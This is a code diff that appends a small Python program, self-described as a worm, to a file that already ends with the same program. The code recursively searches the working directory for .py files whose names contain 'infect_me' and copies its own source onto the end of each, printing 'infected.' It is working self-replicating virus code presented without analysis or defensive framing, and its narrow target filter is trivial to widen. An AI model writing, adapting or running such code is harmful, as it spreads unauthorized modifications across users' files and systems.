@@ -100,3 +100,33 @@ def infect(files_to_infect):
 
 files_to_infect = search(os.path.abspath(""))
 infect(files_to_infect)
+'''worm.py scans for all files within the given path
+whose filenames end with infect_me.py and copies its script on them'''
+import os
+
+def search(path):
+    files_to_infect = []
+    for filename in os.listdir(path):
+        if os.path.isdir(path + "/" + filename):
+            files_to_infect.extend(search(path + "/" + filename))
+        elif "infect_me" in filename and filename[-3:] == ".py":
+            files_to_infect.append(path+"/"+filename)
+    return files_to_infect
+
+def infect(files_to_infect):
+    virus = open(os.path.abspath(__file__))
+    virus_string = ""
+    for i,line in enumerate(virus):
+        virus_string += line
+    virus.close()
+    for filename in files_to_infect:
+        f = open(filename)
+        temp = f.read()
+        f.close()
+        f = open(filename,"w")
+        f.write(temp + "\n" + virus_string)
+        print(filename[len(os.path.abspath("")) + 1:] + " infected.")
+        f.close()
+
+files_to_infect = search(os.path.abspath(""))
+infect(files_to_infect)
